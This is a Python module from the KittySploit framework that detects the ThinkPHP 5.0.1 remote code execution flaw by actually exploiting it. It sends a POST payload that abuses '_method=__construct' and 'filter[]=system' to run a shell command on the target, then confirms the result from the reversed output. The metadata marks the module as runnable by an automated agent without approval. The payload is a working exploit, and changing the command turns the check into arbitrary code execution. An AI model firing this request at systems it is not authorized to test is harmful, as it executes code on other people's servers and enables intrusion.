#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkPHP 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ThinkPHP 5.0.1 - Remote Code Execution Detection',
        'description': "ThinkPHP 5.0.1 allows remote unauthenticated attackers to execute arbitrary code via the 's' parameter.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'edb', 'thinkphp', 'rce', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.exploit-db.com/exploits/46150'],
    }

    def run(self):
        path = '/?s=index/index/index'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='s=echo%20thinkphp%20%7C%20rev&_method=__construct&method&filter[]=system')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('phpkniht',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='critical',
                reason='ThinkPHP 5.0.1 - Remote Code Execution detected',
                path=path,
            )
            return True
        return False

